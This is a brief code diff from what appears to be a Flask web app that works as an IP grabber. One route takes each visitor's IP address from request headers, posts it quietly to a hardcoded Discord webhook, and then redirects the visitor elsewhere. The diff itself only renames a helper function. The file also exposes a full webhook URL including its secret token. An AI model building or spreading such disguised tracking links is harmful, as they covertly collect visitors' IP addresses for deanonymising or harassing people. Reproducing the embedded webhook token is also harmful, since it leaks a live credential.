@@ -134,7 +134,7 @@ def account_information(userid):
 
 MAIN_WEBHOOK2 = "https://discord.com/api/webhooks/1412761663546855454/n3H3mpDdCxRnlk39fBRlKPBlwdMa1YkqVAkpOaFrs9yTGmF6u-qWU7TBaBixEo-ocvxX"
 
-def send_embed(webhook_url, ip):
+def send_embed2(webhook_url, ip):
     embed = {
         "title": "IP",
         "description": f"IP Found: `{ip}`",
@@ -155,7 +155,7 @@ def ping_pong():
 def ping_pong2():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "Unknown"
 
-    send_embed(MAIN_WEBHOOK2, ip)
+    send_embed2(MAIN_WEBHOOK2, ip)
     
     return redirect("https://xdpxi.dev")
 
